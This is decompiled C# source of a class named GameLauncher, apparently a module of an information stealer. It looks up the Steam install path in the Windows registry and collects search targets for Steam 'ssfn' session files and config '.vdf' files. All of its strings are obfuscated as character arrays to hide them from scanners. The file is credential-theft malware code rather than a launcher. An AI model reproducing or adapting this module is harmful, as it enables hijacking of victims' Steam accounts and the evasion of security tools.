using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000029 RID: 41
public class GameLauncher : Extractor
{
	// Token: 0x060000E2 RID: 226 RVA: 0x00008438 File Offset: 0x00006638
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo fileInfo)
	{
		try
		{
			if (scannerArg.Id1.Contains(new string(new char[]
			{
				'c',
				'o',
				'n',
				'f',
				'i',
				'g'
			})))
			{
				return new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				});
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x060000E3 RID: 227 RVA: 0x000084A0 File Offset: 0x000066A0
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[]
			{
				'S',
				'o',
				'f',
				't',
				'w',
				'a',
				'r',
				'e',
				'\\',
				'V',
				'a',
				'l',
				'v',
				'e',
				'\\',
				'S',
				't',
				'e',
				'a',
				'm'
			}));
			if (registryKey == null)
			{
				return list;
			}
			string text = registryKey.GetValue(new string(new char[]
			{
				'S',
				't',
				'e',
				'a',
				'm',
				'P',
				'a',
				't',
				'h'
			})) as string;
			if (!Directory.Exists(text))
			{
				return list;
			}
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = text,
				Id2 = new string(new char[]
				{
					'*',
					's',
					's',
					'f',
					'n',
					'*'
				}),
				Id3 = false
			});
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = Path.Combine(text, new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				})),
				Id2 = new string(new char[]
				{
					'*',
					'.',
					'v',
					's',
					't',
					'r',
					'i',
					'n',
					'g',
					'.',
					'R',
					'e',
					'p',
					'l',
					'a',
					'c',
					'e',
					'd',
					'f'
				}).Replace("string.Replace", string.Empty),
				Id3 = false
			});
		}
		catch
		{
		}
		return list;
	}
}
